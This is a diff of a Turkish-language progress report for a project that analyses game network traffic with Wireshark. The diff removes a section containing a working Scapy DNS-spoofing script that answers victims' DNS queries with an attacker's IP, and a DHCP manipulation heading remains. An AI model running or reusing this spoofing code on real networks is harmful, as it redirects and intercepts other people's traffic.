@@ -14,37 +14,18 @@ Bu aşama, projenin başlangıç hedeflerinin başarıyla tamamlandığı ilk te
    - Seçilen popüler çevrimiçi oyunların (CS:GO, Valorant, PUBG) temel ağ bağlantı detaylarının (IP adresleri, portlar, kullanılan protokoller) tespiti ve belgelenmesi.
    - Bulguların README.md dosyasında açık ve anlaşılır bir şekilde sunulması.
 
-## Temel Bileşenlerin Geliştirilmesi
-
 ### Tamamlanan Görevler:
   - Her bir hedef oyun için standart oyun senaryolarında (lobi, oyun içi, sunucu bağlantısı) Wireshark ile ağ trafiği yakalama süreçlerinin tanımlanması ve uygulanması.
   - Oyun trafiğini etkili bir şekilde izole etmek ve analiz etmek için özel Wireshark Capture Filters ve Display Filters setlerinin oluşturulması ve test edilmesi.
   - Yakalanan **.pcap** dosyaları üzerinde temel analizlerin yapılması ve kritik IP adresleri, port aralıkları ve ağ protokollerinin (UDP, TCP) belirlenmes
   - Projenin amacını, hedeflerini, kurulum adımlarını ve ilk bulguları içeren kapsamlı bir README.md dosyasının hazırlanması.
-  - Tespit edilen IP/port/protokol bilgilerini özetleyen detaylı bir **"Oyun Ağ Bağlantıları Analiz Tablosu"**nun oluşturulması ve README.md'ye entegrasyonu.
+  - Tespit edilen IP/port/protokol bilgilerini özetleyen detaylı bir **Oyun Ağ Bağlantıları Analiz Tablosu**nun oluşturulması ve README.md'ye entegrasyonu.
   - İlgili araştırma notları için researchs/ klasörü altında ilk taslak Markdown dosyalarının oluşturulması (örn. csgo_network_analysis.md, wireshark_filters.md).
 
 
 ```
 
-### DNS Spoofing Betiği
-Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.
 
-1. Scapy ile DNS spoofing betiğini yazın:
-
-```python
-from scapy.all import *
-
-def dns_spoof(packet):
-    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
-        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-                         UDP(dport=packet[UDP].sport, sport=53)/\
-                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-        send(spoofed_packet, verbose=0)
-
-sniff(filter="udp port 53", prn=dns_spoof)
 ```
 
 ### DHCP Manipülasyon Betiği
